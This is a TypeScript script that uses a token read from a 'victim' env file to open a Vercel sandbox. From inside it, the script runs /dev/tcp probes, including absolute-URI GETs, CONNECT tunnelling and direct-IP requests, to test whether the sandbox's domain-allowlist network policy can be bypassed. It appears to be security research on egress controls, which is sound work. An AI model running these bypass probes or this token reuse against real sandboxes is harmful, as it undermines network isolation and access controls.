import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  console.log("policy:", JSON.stringify(sbx.networkPolicy));
  const res = await sbx.runCommand("bash", ["-c", `
set +e
echo "=== A. HTTP absolute-URI form via transparent proxy under domain allowlist ==="
echo "--- send raw absolute-form request to gateway:80 (transparent proxy) ---"
timeout 4 bash -c 'exec 3<>/dev/tcp/100.64.0.1/80; printf "GET http://github.com/ HTTP/1.1\r\nHost: github.com\r\nConnection: close\r\n\r\n" >&3; head -c 300 <&3' 2>&1 | head -8
echo ""
echo "=== B. CONNECT method through gateway:80 (HTTP CONNECT tunneling) ==="
timeout 4 bash -c 'exec 3<>/dev/tcp/100.64.0.1/80; printf "CONNECT github.com:443 HTTP/1.1\r\nHost: github.com:443\r\n\r\n" >&3; head -c 200 <&3' 2>&1 | head -8
echo ""
echo "=== C. absolute-form via localhost:80 (does gateway proxy listen on cell lo?) ==="
timeout 4 bash -c 'exec 3<>/dev/tcp/127.0.0.1/80; printf "GET http://github.com/ HTTP/1.1\r\nHost: github.com\r\nConnection: close\r\n\r\n" >&3; head -c 300 <&3' 2>&1 | head -8
echo ""
echo "=== D. direct GET with absolute URI to public IP of github (140.82.112.4:80) ==="
timeout 4 bash -c 'exec 3<>/dev/tcp/140.82.112.4/80; printf "GET http://github.com/ HTTP/1.1\r\nHost: github.com\r\nConnection: close\r\n\r\n" >&3; head -c 300 <&3' 2>&1 | head -8
echo ""
echo "=== E. what does the transparent proxy do for allowed domain (example.com) absolute form ==="
timeout 4 bash -c 'exec 3<>/dev/tcp/100.64.0.1/80; printf "GET http://example.com/ HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" >&3; head -c 300 <&3' 2>&1 | head -8
echo ""
echo "=== F. allow-all comparison: is 100.64.0.1:80 a transparent HTTP proxy? check /proc/net ==="
timeout 2 bash -c 'exec 3<>/dev/tcp/100.64.0.1/80; printf "GET http://example.com/ HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" >&3; head -c 200 <&3' 2>&1 | head -6
echo DONE
`], { wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
